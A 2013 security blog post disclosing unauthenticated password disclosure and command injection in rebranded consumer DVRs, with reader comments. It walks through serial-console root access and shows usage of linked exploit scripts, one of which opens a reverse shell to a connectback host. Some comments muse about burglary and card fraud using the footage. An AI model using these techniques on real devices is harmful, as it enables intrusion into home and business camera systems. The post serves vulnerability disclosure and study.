=== Content from console-cowboys.blogspot.com_fa27e4d6_20250125_015013.html ===


[![consolecowboys](https://blogger.googleusercontent.com/img/a/AVvXsEj3i9Ib1rNePgl_L8__dyLKZ9-GgwlSi2RF6OZu6kV8RTwzrJNVZN3crRCTppFqc_a4-c10NIddh4W0JshWZTjMjYILUeVKbCGsKJVnW09yLWn3hlHIRszAY3aVMnOODN_TolUCVQYs11X6IEHKVCAIXm7dFwns9kZqxFgqEMs2KY9K8gP-9k9PWiPumQ=s150)](http://console-cowboys.blogspot.com/)

## Tuesday, January 22, 2013

### Swann Song - DVR Insecurity

"Swan song" is a metaphorical phrase for a final gesture, effort, or performance given just before death or retirement. This post serves as the "swan song" for a whole slew of DVR security systems. With that being said, I will refer to the lyrical master MC Hammer, lets [turn this mutha' out](http://www.youtube.com/watch?v=2JkDKrM-SzM).

I recently had a chance to get my hands on a 4 channel DVR system system sold under a handful of company banners (4/8/16 channels) - Swann, Lorex, Night Owl, Zmodo, URMET, kguard security, etc. A few device model numbers are - DVR04B, DVR08B, DVR-16CIF, DVR16B

After firing up the device and putting it on the network I noticed that it was running a telnet server, unfortunately the device does not appear to come configured with an easy/weak login :(. Time to open it up and see whats going on :)

After opening the device up something grabbed my attention right away....

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjz7IIEGAmhQtMAEtkNVLHOeo83QfPS6JP2wxYhj8PbNjOS5qQwOj5-JOzEEM2aKaXJGK0CMWxNNrH9YS_ChoyVpYX1LcNXLJpzRbQusegfWjKE3_21zIquSjeDxRuu9M-sMH8ijenf0LHR/s640/board_with_header.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjz7IIEGAmhQtMAEtkNVLHOeo83QfPS6JP2wxYhj8PbNjOS5qQwOj5-JOzEEM2aKaXJGK0CMWxNNrH9YS_ChoyVpYX1LcNXLJpzRbQusegfWjKE3_21zIquSjeDxRuu9M-sMH8ijenf0LHR/s1600/board_with_header.png)

The highlighted header looked like a pretty good possibility for a serial port, time to break out the multi-meter and check. After a couple power cycles, the header was indeed a serial port :)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtJNW91BTe32F_pOzDdQp35hSw9PrbQMQoFJb2v9I6B31IB__skUgfRcDOSs5kLA3x-0Mx5cX4A2wivUO1eZ-uRYEeT3BTkJkhp6HNFzfJUN642h57WeOSrnPkYtzUmK7xqCbUIC6HJ5Tt/s640/pin_header.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtJNW91BTe32F_pOzDdQp35hSw9PrbQMQoFJb2v9I6B31IB__skUgfRcDOSs5kLA3x-0Mx5cX4A2wivUO1eZ-uRYEeT3BTkJkhp6HNFzfJUN642h57WeOSrnPkYtzUmK7xqCbUIC6HJ5Tt/s1600/pin_header.png)

After hooking up my usb to serial breakout board to the device serial port and guessing at the following serial settings: 115200 8-N-1 , I was stuck looking at a login prompt without a working login or password.
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWEuUnYz-MTmeGbgUhMa8TCvRzShp3Kkbni3nx9FLX8tsGq2nlcexdbUQvJpQkSieZgBonEPstG_kHX7QhBZ81NftUfagYM188E5RIMpvCBQA4ozxu1kH5737IxGR2e4r9gaPcHm6M2Xq8/s640/root_prompt.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWEuUnYz-MTmeGbgUhMa8TCvRzShp3Kkbni3nx9FLX8tsGq2nlcexdbUQvJpQkSieZgBonEPstG_kHX7QhBZ81NftUfagYM188E5RIMpvCBQA4ozxu1kH5737IxGR2e4r9gaPcHm6M2Xq8/s1600/root_prompt.PNG)

Lucky for me the device startup can be reconfigured using the u-boot environment. The environment variable "bootargs" can be adjusted to boot the linux system into single user mode by appending "single" to the end of the existing settings:
setenv bootargs mem=68M console=ttyAMA0,115200 root=1f01 rootfstype=jffs2 mtdparts=physmap-flash.0:4M(boot),12M(rootfs),14M(app),2M(para) busclk=220000000 single

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3P_J36ygGb33tB6mpTJo8M07d7YEUFPHt5X1qxjdDd86uEXsrm9JyYwH4vvSXhMoO1kcktenA_ob6w3MgKBay8RoRpdD08rA1hi7hJQ6gMcnakOfrsYiW0t81_hTDNX33kK0V-_oFj5mV/s640/modified_bootargs.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3P_J36ygGb33tB6mpTJo8M07d7YEUFPHt5X1qxjdDd86uEXsrm9JyYwH4vvSXhMoO1kcktenA_ob6w3MgKBay8RoRpdD08rA1hi7hJQ6gMcnakOfrsYiW0t81_hTDNX33kK0V-_oFj5mV/s1600/modified_bootargs.PNG)

This change to the bootargs variable is only temporary at this point, if we were to power cycle the device the change would be lost. It is possible to write these changes to the device, but in this case we only want to boot into single user mode once. To boot the device you need to tell the boot loader where the kernel exists in memory, this value can be found in the default environment variable “bootdcmd”.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5E1v6WN90FY5fj2efsFz8HMjERpY0qCBa_logWgdHkDsnpuXH-Nt_jnGfogDXFRs63wnb3YUVFTGPt4pIN_aEmEzZWubxlQHfYtDihTJAilCT5WGxjOpadyDyFZBfvYTUklRi1KGFcMql/s640/boot_device.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5E1v6WN90FY5fj2efsFz8HMjERpY0qCBa_logWgdHkDsnpuXH-Nt_jnGfogDXFRs63wnb3YUVFTGPt4pIN_aEmEzZWubxlQHfYtDihTJAilCT5WGxjOpadyDyFZBfvYTUklRi1KGFcMql/s1600/boot_device.PNG)

Once the device is booted up in single user mode, the root password can be reset and the device can be rebooted. Telnet now works, but what fun is that when these devices don't normally expose telnet to the internet :). Now for the real fun...looking at the device the default configuration is setup to auto-magically use the power of the dark lord satan (uPnP) to map a few ports on your router (if it supports uPnP). One of the ports that it will expose is for the web (activeX) application and the other is the actual comms channel the device uses (port 9000). The first item I looked at was the web application that is used to view the video streams remotely and configure the device. The first thing that I found with this lovely device is that the comms channel (9000) did not appear to do any authentication on requests made to it...Strike 1. I imagine the activeX application that is used to connect to the device could be patched to just skip the login screen, but that seems like a lot of work, especially when there are much easier ways in. The next thing I saw was a bit shocking...when you access the application user accounts page the device sends the application all the information about the accounts stored on the device. This includes the login and password. In clear text. Strike 2. I created a small PoC in python that will pull the password from a vulnerable device:
> python getPass.py 192.168.10.69
>
> [\*]Host: 192.168.10.69
>
> [+]Username: admin
>
> [+]Password: 123456

Script can be found [here](http://consolecowboys.org/scripts/dvr/getPass.py).

After owning the device at the "application" level, I figured it was time to go deeper.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCRrTXlQ30KljmW5I4FcLqNhQU9aAwNDpZX4WPGMmPTucYnytSjbAZTpGRADjCEfatoA1dFS5iKOXtvzrMu6gZmyuHkjKtbhOGDnE71DV_xA7CLZ4S9kCb7Puz6L600yWfyyBSMhdc55MS/s400/inception.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCRrTXlQ30KljmW5I4FcLqNhQU9aAwNDpZX4WPGMmPTucYnytSjbAZTpGRADjCEfatoA1dFS5iKOXtvzrMu6gZmyuHkjKtbhOGDnE71DV_xA7CLZ4S9kCb7Puz6L600yWfyyBSMhdc55MS/s1600/inception.jpg)

Port 9000 is run by a binary named 'raysharpdvr'. I pulled the binary off the device and started going through it looking for interesting stuff. First thing I noticed was the device was using the "system" call to carry out some actions, after chasing down these calls and not seeing much, the following popped up:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrLxPETLdsKz6yFSV_dA_0iCwIuDy9rhNbipxjW2EIXp59U3qTsa3e1xfWBK3-fG1iqkl3g1ur7-kFZe_9Ouz-PvPhiDNCEAFcuFa8jxtM51UIgUSfenzUTINho7l9TaYQPlo-cxwL7wdp/s640/weeeee_ida.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrLxPETLdsKz6yFSV_dA_0iCwIuDy9rhNbipxjW2EIXp59U3qTsa3e1xfWBK3-fG1iqkl3g1ur7-kFZe_9Ouz-PvPhiDNCEAFcuFa8jxtM51UIgUSfenzUTINho7l9TaYQPlo-cxwL7wdp/s1600/weeeee_ida.PNG)

"sprintf" with user input into a "system", that'll do it. Couple problems to overcome with this. First in order to use this vector for command injection you must configure the device to use "ppp" - this will cause the device to go offline and we will not be able to interact with it further :(. We can get around this issue by injecting a call to the dhcp client appliction ("udhcpc") - this will cause the device to use dhcp to get its network information bypassing the previous "ppp" config. The other issue is once we have reconfigured the device to run our command, it needs to be restarted before it will execute (its part of the init scripts). The application does not actually provide a way to reboot the device using the web interface, there is a section that says 'reboot', but when it is triggered nothing happens and some debugging information displayed in the serial console saying the functionality is not implemented. Lucky for us there are plenty of overflow bugs in this device that will lead to a crash :). The device has a watchdog that polls the system to check if the "raysharpdvr" application is running and if it does not see it, it initiates a system reboot - very helpful. With those two issues out of the way the only thing left is HOW to talk to our remote root shell that is waiting for us....luckily the device ships with netcat built into busybox, -e flag and all :)
> Usage: sploit.py <target> <connectback host> <connectback port>
>
> $ python sploit.py 192.168.10.69 192.168.10.66 9999
>
> [\*]Sending Stage 1
>
> [\*]Sending Stage 2
>
> [\*]Rebooting the server with crash....
>
> Ncat: Version 5.21 ( http://nmap.org/ncat )
>
> Ncat: Listening on 0.0.0.0:9999

Strike 3, get this weak shit off my network. The script can be found [here](http://consolecowboys.org/scripts/dvr/dvrown.py). The script relies on the web application running on port 80, this is not always the case so you may need to adjust the script to fix if your device listens on another port. It is also worth noting that it may take a few minutes for the device to reboot and connect back to you.
Unfortunately the web server that runs on this device does not behave correctly (no response headers) so I do not believe finding these online is as easy as searching shodan, however it is possible to fingerprint vulnerable devices by looking for hosts with port 9000 open.

tl;dr; A whole slew of security dvr devices are vulnerable to an unauthenticated login disclosure and unauthenticated command injection.

By

[someLuser](https://www.blogger.com/profile/16124941373996159409 "author profile")

at

[January 22, 2013](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=5948768001255972621&postID=6576519571275822110&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=5948768001255972621&postID=6576519571275822110&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=5948768001255972621&postID=6576519571275822110&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=5948768001255972621&postID=6576519571275822110&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=5948768001255972621&postID=6576519571275822110&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=5948768001255972621&postID=6576519571275822110&target=pinterest "Share to Pinterest")

Labels:
[command injection](http://console-cowboys.blogspot.com/search/label/command%20injection),
[dvr](http://console-cowboys.blogspot.com/search/label/dvr),
[remote exploit](http://console-cowboys.blogspot.com/search/label/remote%20exploit),
[swann dvr](http://console-cowboys.blogspot.com/search/label/swann%20dvr),
[weak shit](http://console-cowboys.blogspot.com/search/label/weak%20shit)

#### 67 comments:

1. ![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_Kn7DhCOa2XP7V61PHAc-g1oaof2tHSAHb75ZzjO9tAWZlSTz8kmKmo_4aPoO2iJYK02nZhR7yRMdC0TkU04OIHZ0zfQ2DOF4V2U_5n4RLi36O8jtZhqzVp2VVPCIxQ/s45-c/obscuresec.png)[Chris](https://www.blogger.com/profile/10815120708533310068)[January 23, 2013 at 5:27 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1358990843257#c5389116487887060628)

   Awesome post. Was this vuln reported? I am looking for a vuln ID to reference the login disclosure.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5389116487887060628)Replies
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[someLuser](https://www.blogger.com/profile/16124941373996159409)[January 24, 2013 at 7:27 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359041277888#c6178088928051409471)

     No vuln ID has been assigned.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6178088928051409471)Replies
     Reply
   Reply
2. ![](//www.blogger.com/img/blogger_logo_round_35.png)[jericho](https://www.blogger.com/profile/16053261107376878357)[January 25, 2013 at 11:46 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359143219631#c2578463181525583103)

   Neat write-up! We're looking to add these issues to OSVDB.org and wanted to clarify a few things.

   1." when you access the application user accounts page the device sends the application all the information about the accounts stored on the device. This includes the login and password. In clear text." You say "page" but the script doesn't appear to access a page in the sense of a web page. Can you clarify if there is a page/script that is used?

   2. The issue above, along with command injection via Port 9000 / udhcpc, and the remote overflow dos to trigger reboot, seem like the 3 main issues. Does that sound right?

   Thanks!

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=2578463181525583103)Replies
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[someLuser](https://www.blogger.com/profile/16124941373996159409)[January 25, 2013 at 1:40 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359150006641#c5289754001555745125)

     1) The "page" is actually just an activeX control that is loaded when the user visits whatever port the "web" viewer is configured for (default 80) - the activeX control then talks to the device via port 9000 behind the scenes.

     2) Yes - although I believe there are more issues to be found in these devices.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5289754001555745125)Replies
     Reply
   Reply
3. ![](//www.blogger.com/img/blogger_logo_round_35.png)[jericho](https://www.blogger.com/profile/16053261107376878357)[January 25, 2013 at 9:37 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359178666984#c5418316771789570123)

   1) Happen to know the ActiveX control name/file?

   2) I do not doubt that one bit =)

   Thanks!

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5418316771789570123)Replies
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[someLuser](https://www.blogger.com/profile/16124941373996159409)[January 28, 2013 at 8:08 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359389311911#c1038751280606221527)

     HiDvrOcx.cab - contains all of the controls used by these devices, as I recall the page loads "DvrOcx.ocx". I no longer have the device so I cannot confirm.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=1038751280606221527)Replies
     Reply
   Reply
4. ![](//resources.blogblog.com/img/blank.gif)Anonymous[January 27, 2013 at 12:05 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359317149825#c9100550570396880739)

   So, if you can hack the console of a Swann DVR, how the hell can I get the video streams out of it without using their stupid Safari/IE only web GUI?

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=9100550570396880739)Replies
   - ![](//resources.blogblog.com/img/blank.gif)Anonymous[January 29, 2013 at 6:48 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359470893350#c6108585218536140949)

     I'm not positive, but my guess is they expose their video streams as some RTSP channel that you could simply play using VLC. RTSP has basic and digest authentication; my guess is this blog post pretty much outlines everything you would ever need to pull video from the device outside of their web UI.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6108585218536140949)Replies
     Reply
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Woodchuck](https://www.blogger.com/profile/01730813357056348841)[April 16, 2013 at 10:20 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1366132836140#c7294159677096102592)

     I'm looking to get access to the video via RTSP, or something similar as well. I used Lineshark to sniff a few packets and can see where the initial HTTP request comes in, but then it appears things are handed off to the ActiveX control immediately and from there all the communication is happening in TCP. In one of the TCP packets after I have logged in via ActiveX, I can see my username/password in the packet contents. From there there are a bunch of packets going back and forth in TCP, but I cannot figure out what to do from here. I need to find a URL to pass to VLC, but I don't see anything of the sort after the ActiveX takes over. Ideas?

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=7294159677096102592)Replies
     Reply
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Woodchuck](https://www.blogger.com/profile/01730813357056348841)[April 16, 2013 at 10:51 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1366134708519#c1344009002781140572)

     Just noticed the thead below by Damo on April 7th that starts to cover this. I'm hoping to get access to the video w/o the need for this stupid Activex control.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=1344009002781140572)Replies
     Reply
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Damo](https://www.blogger.com/profile/15163947273975815214)[July 10, 2013 at 6:17 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1373505449954#c2434905739323832059)

     Hi Woodchuck - get in touch with me (Damo) if you're still interested in this stuff - I have made some more progress on several fronts with regards to these things - me@damow.net

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=2434905739323832059)Replies
     Reply
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[John Wuethrich](https://www.blogger.com/profile/13009725193935033222)[June 24, 2017 at 4:34 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1498347257399#c2664307313403671849)

     motion server?

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=2664307313403671849)Replies
     Reply
   Reply
5. ![](//www.blogger.com/img/blogger_logo_round_35.png)[bojan](https://www.blogger.com/profile/14390040438591638164)[January 29, 2013 at 2:21 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359454909246#c5260649607968700780)

   Oh God, when IT boffins try to look smart in PhySec :)

   What is there really to exploit in a DVR?

   It does not secure anything (despite the implication, a DVR is not a security system in classical sense, since it's not preventive).

   Cheap 4channel DVR like the one you describe -- -- it's typical usage (from my 10 years in the industry as an integrator expereience) is:

   a) quad live view of 4 cameras around your house
   b) looking at what your empleyees are doing.

   In both cases, physical access to the room in which the DVR typically gets installed means DVR compromising is the least of your problems.

   The other issue is tad more serious (you can inject code into the client computer looking at DVR). But web viewer's purpose is to gain access to your video stream from an insecure location (internet cafe, tho it might be users laptop). Any security integrator worth it's salt will advise specialized app (CCTV Client) to connect to the video data stream directly, if nothing than to avoid using IE.

   In other words, while your observation is factually correct, it's of very little practical value.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5260649607968700780)Replies
   - ![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiauUjaUQVMxhf_JI2uV0t6bAojHeKuFladQDnNK6WaEhyeNlLqQhKB-_nDOveukofxdDNLcwQEB6667nwgxICIUMS1poLxY4_HpXRDd-8KAiDNSCJ2gV1Lf4bbO0ElcA/s45-c/gravatar-yb-200-trans.png)[Frank Ch. Eigler](https://www.blogger.com/profile/06535966377820034604)[January 29, 2013 at 4:08 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359461285305#c1353995112088837484)

     "What is there really to exploit in a DVR? "

     If the DVR is connected to the outside internet, then random joes from the internet can trivially break into the device, take it over, and from there hop onto anything else on your local network.

     That's what.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=1353995112088837484)Replies
     Reply
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[bojan](https://www.blogger.com/profile/14390040438591638164)[January 29, 2013 at 4:33 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359462832034#c5581633764720351334)

     Fair enough. I missed that it's the video stream port that you can gain shell access through (as this is typically the only port we leave open on DVRs we install).

     Will check this against some Linux based devices I deal with.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5581633764720351334)Replies
     Reply
   - ![](//resources.blogblog.com/img/blank.gif)Anonymous[January 29, 2013 at 6:50 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359471031869#c4262078164541895969)

     Okay, here's a hypothetical: I war-drive around the neighborhood, looking for networks that are open or using wep (crackable). Once I get on the network, I look for these surveillance systems.

     I get access to the video streams.

     After I do this, I know when you're home and when you aren't; I'm free to rob you at my leisure.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=4262078164541895969)Replies
     Reply
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/15538246760959678372)[January 29, 2013 at 12:59 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359493145439#c6877648693868234979)

     Bojan, unfortunately you're not a good security expert.

     Just because you can't see it as a problem that doesn't prove it isn't.

     Please remove your head, and understand the big picture, that you don't know everything about every situation....

     For instance, I'm pretty sure everyone using one of these has a reason to monitor whatever it's looking at. Just turning off that monitoring before/after the crime makes that crime easier to commit without being caught.

     Obviously, the video itself may expose other secrets - who wouldn't point a camera at the main door? Where's the coded alarm keypad? Yeah, by the door.
     Now you can break in, without being recorded, and turn off the alarm. Sweet.

     Oh, and if it's a shop, grab the printed credit card receipts, because the CCTV probably recorded a few customers entering their PIN, and those card receipts are nicely timestamped, just like the video.

     Etc. etc. etc.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6877648693868234979)Replies
     Reply
   - ![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbgyjbCPokEPukZAvC5cm_Uqr15UXAUC6kq8scGBLAPJAmARIdhNpo9So5D8hjSqjJkAdZ7EJQ1i3uMMnmdjoAKc6KdWfBVqt6MLaNeLuEiv86Eumr9HPG6AGmouuD33A/s45-c/Me.JPG)[Alex Kwitny (Kwitwell.com)](https://www.blogger.com/profile/12458072273859749789)[February 18, 2014 at 4:27 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1392769679861#c3803281709964952606)

     A perfect example is how China hacked the US chamber of commerce and even a thermostat used there was communicating to China

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=3803281709964952606)Replies
     Reply
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[corrector](https://www.blogger.com/profile/10279658576958532227)[June 17, 2014 at 4:05 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1403046336473#c439276691117079433)

     "because the CCTV probably recorded a few customers entering their PIN"

     what can you do with a PIN and a receipt?

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=439276691117079433)Replies
     Reply
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Nigel](https://www.blogger.com/profile/16570349252948836345)[November 26, 2016 at 3:54 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1480204469151#c938227384992266831)

     Well, I bet that the OP is regretting what he said 3 years ago now! A massive flock of CCTV cameras is breaking the Internet.

     Oh, as regards what you can do with the card number & PIN, pulled from the CCTV? Was that a joke? You can code up your own card, then go use it to withdraw or spend money! (So no, nothing serious at all) POS PoS devices are also on that same network you've compromised, too, btw. And likely the emails from the website, and possibly the database storing bulk credit cards. Need I go on?

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=938227384992266831)Replies
     Reply
   Reply
6. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/04213959178696603658)[January 29, 2013 at 2:59 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359457160378#c7390615040914665876)

   ^^^^

   My point exactly "Bojan" couldnt have said it better.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=7390615040914665876)Replies
   Reply
7. ![](//resources.blogblog.com/img/blank.gif)Anonymous[January 29, 2013 at 11:55 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359489359391#c48858097653268766)

   I tried this technique on my Lorex device, and sure enough it works. More worryingly, if I look at the entire stream of data heading out from the DVR (the quick way is to just add a "print a" statement to your python script), I found the username and password (in plain text) for my email address. Why was it there? Because you can enter both in the device's settings, along with your outgoing mail server, and have it email you alerts. Stupid me for trusting a consumer-grade black box with my email password.

   One changed password later, I also disabled port forwarding from my modem/router to the Lorex box (handy for viewing the cameras with my smartphone). Now the device is reachable ONLY from inside my network. This means to see the camera streams from outside the network I first have to establish a VPN connection back. It's an extra, annoying step, but if you feel you need to access your camera from outside your network, I highly recommend it.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=48858097653268766)Replies
   Reply
8. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/06428933126242690132)[January 29, 2013 at 12:36 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359491808091#c4862525896078811569)

   Been trying to crack the hashed password I grabbed off a Swann DVR for about a week now but only processing about 6k c/s so it's slow going. The password is stored unsalted in a MD5 hash. You can grab the passwd file using vulnerability in path navigation against the web server. Lame.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=4862525896078811569)Replies
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/13711121783719950792)[July 24, 2016 at 9:15 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1469420113018#c5481996536363055882)

     I'm trying to do this on my Night Owl unit although I have no idea how to.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5481996536363055882)Replies
     Reply
   Reply
9. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/15538246760959678372)[January 29, 2013 at 12:42 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359492177252#c8900877620567219258)

   Ooops, Maplin in the UK sell a lot of these Swann DVRs:

   http://www.maplin.co.uk/swann-house

   Great writup for generic 'how to r00t your cheapo smart home device.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=8900877620567219258)Replies
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Nigel](https://www.blogger.com/profile/16570349252948836345)[November 26, 2016 at 3:57 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1480204658693#c4168519564911737837)

     I've got a customer who has, I think, been hit by this. I figured out it was hacked, but assumed it was a weak password. The new device, from Swann's new range, appears to have been re-pwned despite a strong (though somewhat short 8 characters) password. Inside of a week!

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=4168519564911737837)Replies
     Reply
   Reply
10. ![](//www.blogger.com/img/blogger_logo_round_35.png)[batona](https://www.blogger.com/profile/07725931624100548828)[January 29, 2013 at 1:14 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359494051897#c8916993920859053264)

    I get:
    C:\PYTHON33>getPass.py 192.168.10.69
     File "C:\Python33\getPass.py", line 1
     import socket,binascii,sys,re t1 =
     ^
    SyntaxError: invalid syntax

    We have over 50 of these in our company and need to see if we have this exploit. They are behind a firewall but still..

    I get the same message with the dvrown.py

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=8916993920859053264)Replies
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Daddy](https://www.blogger.com/profile/02357793368786933029)[January 31, 2013 at 11:15 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359659729596#c7194014875619973132)

      This comment has been removed by the author.

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=7194014875619973132)Replies
      Reply
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Daddy](https://www.blogger.com/profile/02357793368786933029)[January 31, 2013 at 11:26 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359660370116#c4791281688306580163)

      This comment has been removed by the author.

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=4791281688306580163)Replies
      Reply
    - ![](//resources.blogblog.com/img/blank.gif)Anonymous[February 14, 2013 at 1:48 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1360878499340#c9033689522556696663)

      batona, did you ever figure out the problem with this? I'm getting the exact same errors you are.

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=9033689522556696663)Replies
      Reply
    Reply
11. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Daddy](https://www.blogger.com/profile/02357793368786933029)[January 31, 2013 at 11:02 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1359658943716#c6189213104328052713)

    This comment has been removed by the author.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6189213104328052713)Replies
    Reply
12. ![](//resources.blogblog.com/img/blank.gif)Anonymous[February 14, 2013 at 4:28 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1360888103315#c4928676376500783041)

    Thanks for the great article... proved useful for gaining access to the cmd prompt of my Night Owl Zeus DVR16B.
